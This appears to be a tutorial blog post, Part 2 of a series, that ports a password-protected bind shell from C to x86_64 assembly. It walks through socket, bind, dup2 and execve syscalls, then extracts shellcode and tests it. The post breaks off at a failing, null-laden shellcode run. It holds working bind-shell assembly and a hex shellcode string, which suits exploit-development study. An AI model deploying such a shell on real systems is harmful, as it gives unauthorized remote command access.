---
title: "Implementing a password protected bind shell in shellcode - Part 2"
categories:
  - blog
---

Now that we have the finalized code in C, we can begin the process of "converting" the code to Linux 64-bit Assembly code. The reason that we first wrote the program in C should become apparent as we go through the process.

<h3>Background</h3>

We need to do a little bit of homework before we can just jump into coding in Assembly and I will try my best to explain the needed background on the workings of Assembly, syscalls, registers and the stack.

<h2>What is Assembly?</h2>

Assembly is, in very basic terms, a low level programming language and is as close as you can get to actual machine language. Every type of computer architecture or even operating system will have its own assembly language due to the differences in instructions, registers and how it uses the stack. This blog specifically focuses on Linux x86_64 assembly.

<h2>What are Registers?</h2>

Registers are temporary storage areas that are built into the CPU. Registers can be used to store data, move data to and from other registers or move data to and from memory etc. The registers that we will working with primarily is:

<ul>
  <li>RAX</li>
  <li>RBX</li>
  <li>RCX</li>
  <li>RDX</li>
  <li>RSI</li>
  <li>RDI</li>
  <li>RSP</li>
</ul>

There are other registers to, R8 - R15 for instance, but we will not be working with these so much.

It is also important to understand the structure of a register, especially when working with 64 bit registers. The reason why will become clearer when we reach the last phase of our process for generating shellcode. The important thing to remember is that a register can be broken up into smaller parts/bytes and based on this distinction, the name of the register changes. If we use 'rax' in our Assembly code then we will be referring to the full 64-bit register and if we use 'eax' in our Assembly code, we will be referring to only the lower 32 byte part of it. The below table should clarify the last statement:

<table style="width:100%">
  <tr>
    <th>64-bit Register</th>
    <th>Lower 32 bits</th>
    <th>Lower 16 bits</th>
    <th>Lower 8 bits</th>
  </tr>
  <tr>
    <td>rax</td>
    <td>eax</td>
    <td>ax</td>
    <td>al</td>
  </tr>
  <tr>
    <td>rsi</td>
    <td>esi</td>
    <td>si</td>
    <td>sil</td>
  </tr>
</table>

<h2>What is the stack?</h2>

The stack a temporary storage location for use with common operations. The most important attribute of the stack you need to know of is that it is LIFO (Last In First Out) and it grows from high memory to low memory. You can think of the stack as a stack of trays in a cafeteria where the last tray that was put on the top of the tray stack will be the one that the next customer takes off the stack to dish up. The register that keeps track of the stack is the RSP (Stack Pointer) Register.

<h2>What are syscalls?</h2>

If you can recall from Part 1, syscalls are System Calls that are used to make requests from the user space into the Linux Kernel. Each syscall has a permanent number assigned to it so that the linux kernel knows what you are trying to do when it receives the instruction. The full list of all syscalls and their associate numbers can be found [here](https://filippo.io/linux-syscall-table/). The syscall numbers that we used in our C program are as follows:

```c++
read == 0
socket == 41
bind == 49
listen == 50
accept == 43
close == 3
dup2 == 33
execve == 59
exit == 60
```


So how do we use syscalls with Assembly code? Well, syscalls have a set structure in machine language terms. Specific registers are used for specific arguments and then the 'syscall' instruction is then given that will pass all the arguments in said registers. Below are the registers and what they are used for:

```c++
RAX -> system call number
RDI -> first argument
RSI -> second argument
RDX -> third argument
```

Let's take our first stage code from Part 1 as an example to clarify further.

```c++
sock = socket(AF_INET, SOCK_STREAM, 0);
```

So from what we now know, if we wanted to write corresponding Assembly code for this C code then we will have to assign 41 (socket syscall number) to RAX, AF_INET to RDI, SOCK_STREAM to RSI and 0 to RDX and finally provide the 'syscall' instruction. One more thing to remember is that the return value of the syscall instruction is stored in the RAX register. We will be doing this quite a few times in the actual code so you have a few more chances to understand if this is still confusing.

You can read up a bit further on how this works [here](https://www.cs.fsu.edu/~langley/CNT5605/2017-Summer/assembly-example/assembly.html).

That about does it for the background knowledge. Let's get started with coding in Assembly.

<h2>Writing a password protected bind shell in 64-bit Assembly</h2>

Now that we are ready to start the actual Assembly code, let's create the skeleton for our program and define the different areas of code we will be using:

```nasm
global _start


_start:

exit:

```
<h3>Stage 1 - Creating a socket</h3>

```c++
sock = socket(AF_INET, SOCK_STREAM, 0)
```

We have pretty much already finished this part of the code in our example above, but we still need to figure out how to pass arguments like AF_INET into assembly. Syscall arguments like these have a pre-defined constant assigned to them just like syscalls do. An easy way for us to find out what these values are, is to use python to do this work for us. Have a look at the following:

```python
Python 2.7.15+ (default, Jul  9 2019, 16:51:35)
[GCC 7.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
 >>> import socket
 >>> socket.AF_INET
 2
 >>> socket.SOCK_STREAM
 1
```

From the python output above, we can see that the value for AF_INET needs to be 2 and the value for SOCK_STREAM needs to be 1. So lets put together our first block of assembly code.

```nasm
mov rax, 41 ;Syscall number for socket
mov rdi, 2 ;Value for AF_INET
mov rsi, 1 ;Value for SOCK_STREAM
mov rdx, 0 ;Third argument where we need to pass a 0
syscall //Give the syscall instruction
```

If the above code block does not make sense, please review the "What are syscalls section".

<h3>Stage 2 - Binding the newly created socket to a port</h3>

So remember that the return value from a syscall instruction will be saved in RAX and most of the subsequent instructions require "sock" as the first argument. So for this purpose, we will move the value inside RAX to RDI for use as the first argument in later syscall instructions.

```nasm
mov rdi, rax
```

Next up is setting up the Data Structure that we need for the bind syscall. We will make use of the Stack for this and remember that the Stack is LIFO, so we need to start with the last argument first. We do need to figure out what to pass as arguments for INADDR_ANY and the port to bind to. We need to hardcode the port in this case as there is no opportunity to pass arguments to your shellcode. So once again Python to the rescue.

```python
Python 2.7.15+ (default, Jul  9 2019, 16:51:35)
[GCC 7.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import socket
>>> socket.INADDR_ANY
0
>>> socket.htons(4444)
23569 # value of 4444 in byte order
>>> hex(socket.htons(4444))
'0x5c11' 
>>>
```

So it seems that we need to pass 0 for INADDR_ANY and the hex value of the byte order of port 4444 is 0x5c11.

```c
server.sin_family = AF_INET;
server.sin_port = htons(atoi(arguments[2]));
server.sin_addr.s_addr = INADDR_ANY;
bzero(&server.sin_zero, 8);
```

```nasm
xor rax, rax ;zero out the rax register

push rax ;push the 8 zero bytes, in rax, to the stack for bzero
mov dword [rsp-4], eax ; move 4 bytes (because eax is the 32-bit part of rax) of 0's onto the stack (INADDR_ANY = int 0) at stack pointer - 4 bytes
mov word [rsp-6], 0x5c11 ; move the port value onto the stack - 2 bytes
mov word [rsp-8], 0x2 ;move the value 2 (for AF_INET) on the stack at stack pointer - 8 bytes
sub rsp, 8 ;adjust the stack pointer by 8 bytes for the above 3 commands so that RSP points to the beginning of our Data Structure
```

```c 
bind(sock, (struct sockaddr *)&server, sockaddr_len);
```

Ok, now that RSP is pointing to our constructed Data Structure, let's write the syscall instructions.

```nasm
mov rax, 49 ;syscall number for bind
mov rsi, rsp ;mov rsp (pointer to our data structure) into rsi as second argument. Remember rdi is already set with the first argument
mov rdx, 16 ; mov 16 into rdx for sockaddr_len. 8 zero bytes + 4 bytes INADDR_ANY + 2 bytes port + 2 bytes AF_INET = 16 bytes
syscall ;syscall bind instruction
```


<h3>Stage 3 - Listen for incoming connections on the newly created socket</h3>

Our listen syscall is straight forward.

```c
listen(sock, 2);
```

```nasm
mov rax, 50 ;syscall number for listen
mov rsi, 2 ;move value of 2 into rsi for second argument.
syscall ;syscall listen instruction
```

<h3>Stage 4 - Wait for incoming connections on the newly created socket</h3>

```c
new_sock = accept(sock, (struct sockaddr *)&client, &sockaddr_len);
close(sock);
```

For the client sockaddr Data Strucute we only need to reserve space on the stack to hold the client data as accept will populate the information for us. After we have our "new_sock", return value of the accept syscall stored in rax, we need to also close the original socket.

```nasm
mov rax, 43 ;syscall number for accept
sub rsp, 16 ;move the stack pointer 16 bytes for client Data Structure
mov rsi, rsp ;move the stack pointer to rsi as third argument 
mov byte [rsp-1], 16 ;move the value 16 onto the stack for sockaddr_len
sub rsp, 1 ;adjust the stack pointer to point to the value 16
mov rdx, rsp ;store rsp in rdx as third argument
syscall ;syscall accept instruction
        
mov r9, rax ;store "new_sock" in a safe place to use later

mov rax, 3 ;syscall number for close
syscall ;syscall close instruction
```

<h3>Stage 5 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>

This one is straight forward again, we just need to use dup2 three times for mapping the shell capabilities. You should be able to do these three by yourself now so no explanations in the code this time. The only thing to remember is that we have stored our "new_sock" file descriptor in r9, so we will just move that into rdi for the first syscall and then keep it there for the subsequent two dup2 syscalls.

```c
dup2(new_sock, 0);
dup2(new_sock, 1);
dup2(new_sock, 2);
```

```nasm
mov rax, 33
mov rdi, r9
mov rsi, 0
syscall

mov rax, 33
mov rsi, 1
syscall

mov rax, 33
mov rsi, 2
syscall
```

<h3>Stage 6 - Wait for input (password) to be received and compare it against the correct password string</h3>

For this step, we will define a password and then load that password into a register and compare the string with whatever is passed back from the incoming connection. We define the password with "db" or data byte so as to allocate some space, and fill it with a string. We will fetch this string using the RIP Relative Addressing method only available in 64-bit Assembly. Relative addressing will compute the address of the pass variable relative to the RIP (instruction pointer) and we can then just load this variable by using the ```rel pass``` notation. 

```c
read(new_sock, buf, 16);
buf[strcspn(buf, "\n")] = 0;
if (strcmp(arguments[3], buf) == 0)
{
}
```

```nasm
        xor rax, rax ;zero out rax - read syscall number = 0
        push r10 ;push 8 bytes to the stack for 16 byte password support
        mov rsi, rsp ;move the stack pointer to the 16 bytes into rsi for second argument 
        mov rdx, 16 ;move the value 16 into rdx as third argument
        syscall ;syscall read instruction

        mov rax, [rel pass] ;load password variable into rax
        mov rdi, rsi ;load the 8 bytes received from the client into rdi
        scasq ;scasq will compare rax with rdi 
        jne exit ;if the two strings contained within rax and rdi do not match, then jump to our exit syscall instruction

        ; change as needed
        pass: db "8bytesss" ;define a password

exit:
        mov rax, 60 ;syscall number for exit = 60
        syscall ;syscall exit instruction
```

<h3>Stage 7 - Spawn the shell, if password is correct</h3>

So, if we entered the correct password then the code would have jumped over the jne (jump if not equal) instruction and continued on to our execve code where we will actually launch our /bin/sh shell. We will once again be using the stack for this one and to do this we need to clearly understand how execve accepts the arguments. We will not be passing any commandline arguments or environmental variable arguments, so it should look something like this:

<table style="width:100%">
  <tr>
    <th>First Argument</th>
    <th>Second Argument</th>
    <th>Third Argument</th>
  </tr>
  <tr>
    <th>rdi</th>
    <th>rsi</th>
    <th>rdx</th>
  </tr>
  <tr>
    <td>pathname - Filename of executable and optional arguments</td>
    <td>argv - Pointer to the address of our filneame and optional commandline arguments</td>
    <td>envp - Optional environmental variables</td>
  </tr>
  <tr>
    <td>/bin/sh, 0x0</td>
    <td>Address of /bin/sh, 0x0000000000000000</td>
    <td>0x0000000000000000</td>
  </tr>
</table>

We are using the stack so we will have to construct this command in reverse order. Another important attribute of the 64-bit architecture is that it is little-endian which basically means it will retrieve objects in reverse order. This effectively means that if we want to pass /bin//sh (we add a / to make it a nice 8 bytes, this has no affect on how the OS interprets it), then we need to pass it as hs//nib/ and in hex format. We can easily use python for this once again though.

```python
shell = '/bin//sh'
shell[::-1]
'hs//nib/'
shell[::-1].encode('hex')
'68732f2f6e69622f'
```

```c
execve(arguments[0], &arguments[0], NULL);
```

```nasm
xor rax, rax ;zero out rax
push rax ;push 8 zero bytes onto the stack for third argument 

mov rbx, 0x68732f2f6e69622f ;move the /bin//sh string to rbx register
push rbx ;push the value onto the stack

mov rdi, rsp ;the stack pointer now points to the address of /bin//sh and 8 zero bytes on the stack so lets move that to rdi for first argument

push rax ; Lets add another 8 zero bytes on the stack

mov rdx, rsp ; the stack pointer now points to 8 zero bytes, so lets move that into rdx for third argument

push rdi ; rdi is currently pointing to the address of /bin//sh so lets put that on the stack
mov rsi, rsp ;move the stack pointer for address of /bin//sh into rsi for second argument
mov rax, 59 ;syscall number for execve
syscall ;execve syscall instruction
```

Ok, that last part was quite a confusing bit, but after a few times you should get it.

And that's it, we can now compile and run it and we should be presented with the same capabilities of our C program.

```bash
┌──(kali㉿kali)-[~/pass_bind_nasm]
└─$ nasm -felf64 pass_bind.nasm -o pass.o
                                                                           
┌──(kali㉿kali)-[~/pass_bind_nasm]
└─$ ld pass.o -o pass

┌──(kali㉿kali)-[~/pass_bind_nasm]
└─$ ./pass

```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nv 127.0.0.1 4444
(UNKNOWN) [127.0.0.1] 4444 (?) open
8bytesss
whoami
kali
```


```bash
┌──(kali㉿kali)-[~/pass_bind_nasm]
└─$ for i in $(objdump -d pass -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
\xb8\x29\x00\x00\x00\xbf\x02\x00\x00\x00\xbe\x01\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x11\x5c\x66\xc7\x44\x24\xf8\x02\x00\x48\x83\xec\x08\xb8\x31\x00\x00\x00\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\xb8\x32\x00\x00\x00\xbe\x02\x00\x00\x00\x0f\x05\xb8\x2b\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48\x89\xe2\x0f\x05\x49\x89\xc1\xb8\x03\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x4c\x89\xcf\xbe\x00\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\xbe\x01\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\xbe\x02\x00\x00\x00\x0f\x05\x48\x31\xc0\x41\x52\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\x48\x8b\x05\x28\x00\x00\x00\x48\x89\xf7\x48\xaf\x75\x29\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05\x38\x62\x79\x74\x65\x73\x73\x73\xb8\x3c\x00\x00\x00\x0f\x05
```

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xb8\x29\x00\x00\x00\xbf\x02\x00\x00\x00\xbe\x01\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x11\x5c\x66\xc7\x44\x24\xf8\x02\x00\x48\x83\xec\x08\xb8\x31\x00\x00\x00\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\xb8\x32\x00\x00\x00\xbe\x02\x00\x00\x00\x0f\x05\xb8\x2b\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48\x89\xe2\x0f\x05\x49\x89\xc1\xb8\x03\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\x4c\x89\xcf\xbe\x00\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\xbe\x01\x00\x00\x00\x0f\x05\xb8\x21\x00\x00\x00\xbe\x02\x00\x00\x00\x0f\x05\x48\x31\xc0\x41\x52\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\x48\x8b\x05\x28\x00\x00\x00\x48\x89\xf7\x48\xaf\x75\x29\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05\x38\x62\x79\x74\x65\x73\x73\x73\xb8\x3c\x00\x00\x00\x0f\x05"
int main()
{

        printf("Shellcode Length:  %d\n", (int)strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}```


```bash
┌──(kali㉿kali)-[~/pass_bind_nasm]
└─$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode         
┌──(kali㉿kali)-[~/pass_bind_nasm]
└─$ ./shellcode                                                            
Shellcode Length:  2
Segmentation fault
```


```bash
┌──(kali㉿kali)-[~/pass_bind_nasm]
└─$ objdump -d pass.o | grep 00
0000000000000000 <_start>:
   0:   b8 29 00 00 00          mov    $0x29,%eax
   5:   bf 02 00 00 00          mov    $0x2,%edi
   a:   be 01 00 00 00          mov    $0x1,%esi
   f:   ba 00 00 00 00          mov    $0x0,%edx
  28:   66 c7 44 24 f8 02 00    movw   $0x2,-0x8(%rsp)
  33:   b8 31 00 00 00          mov    $0x31,%eax
  3b:   ba 10 00 00 00          mov    $0x10,%edx
  42:   b8 32 00 00 00          mov    $0x32,%eax
  47:   be 02 00 00 00          mov    $0x2,%esi
  4e:   b8 2b 00 00 00          mov    $0x2b,%eax
  6b:   b8 03 00 00 00          mov    $0x3,%eax
  72:   b8 21 00 00 00          mov    $0x21,%eax
  7a:   be 00 00 00 00          mov    $0x0,%esi
  81:   b8 21 00 00 00          mov    $0x21,%eax
  86:   be 01 00 00 00          mov    $0x1,%esi
  8d:   b8 21 00 00 00          mov    $0x21,%eax
  92:   be 02 00 00 00          mov    $0x2,%esi
  a1:   ba 10 00 00 00          mov    $0x10,%edx
  a8:   48 8b 05 28 00 00 00    mov    0x28(%rip),%rax        # d7 <pass>
  d0:   b8 3b 00 00 00          mov    $0x3b,%eax
00000000000000d7 <pass>:
00000000000000df <exit>:
  df:   b8 3c 00 00 00          mov    $0x3c,%eax
```
